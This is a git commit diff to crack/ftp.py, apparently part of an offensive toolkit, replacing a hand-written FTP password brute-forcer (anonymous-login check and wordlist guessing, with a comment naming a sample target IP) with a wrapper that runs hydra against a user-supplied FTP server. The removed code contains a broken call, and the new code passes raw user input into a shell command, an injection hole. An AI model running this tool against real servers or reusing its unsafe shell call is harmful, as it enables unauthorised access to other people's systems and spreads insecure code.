158823aed5cb806944e683e3c45924f9d9ee6780
Error <88781785+TheSadError@users.noreply.github.com>
2022-07-10 09:17:51 +0300

    Update ftp.py

--- crack/ftp.py
+++ crack/ftp.py
@@ -45,53 +45,15 @@ def menu():
 
 
 def main():
-    def attackv2(target):
-        try:
-            ftp = FTP(target)
-            ftp.login()
-            print(Fore.BLUE+"\n[+] Anonymous login is open.")
-            print(Fore.BLUE+"\n[+] Username : anonymous")
-            print(Fore.BLUE+"\n[+] Password : anonymous\n")
-            ftp.quit()
-        except:
-            pass
-
-
-    def ftp_login(target, username, password):
-        try:
-            ftp = FTP(target)
-            ftp.login(username, password)
-            ftp.quit()
-            print(Fore.BLUE+"\n[!] Credentials have found.")
-            print(Fore.BLUE+"\n[!] Username : {}".format(username))
-            print(Fore.BLUE+"\n[!] Password : {}".format(password))
-            sys.exit(0)
-        except:
-            pass
-
-
-    def attackv1(target, username, wordlist):
-        try:
-            wordlist = open(wordlist, "r")
-            words = wordlist.readlines()
-            for word in words:
-                word = word.strip()
-                ftp_login(target, username, word)
-
-        except:
-            print(Fore.RED+"\n[!] There is no such wordlist file. \n")
-            sys.exit(0)
-
-    target = input("[!] Enter target ip : ") # 198.37.116.30
-    username = input("[!] Enter username : ") # admin
-    n = input("[!] Want spesific wordlist file ? [N/y] : ")
-    if n == "Y" or n == "y":
-        wordlist = input("[!] Enter wordlist file dir : ")
-    else:
-        wordlist = "./smallrockyou.txt"
-    attackv1(target, username, wordlist)
-    attack2(targevt)
-    print(Fore.BLUE+"\n[+] Brute force finished.")
+    url = input(Fore.RED+"[!] Enter Target URL : ")
+    ip = socket.gethostbyname(url)
+    us = input(Fore.RED+"[!] Enter Username Wordlist : ")
+    wr = input(Fore.RED+"[!] Enter Password Wordlist : ")
+    print(Fore.BLUE+f"""
+    Starting FTP Server Brute Force!
+    Target IP : {ip}
+    """)
+    system(f"hydra -L {us} -P {wr} ftp://{ip}")
 
 if __name__ == "__main__":
     user = geteuid()
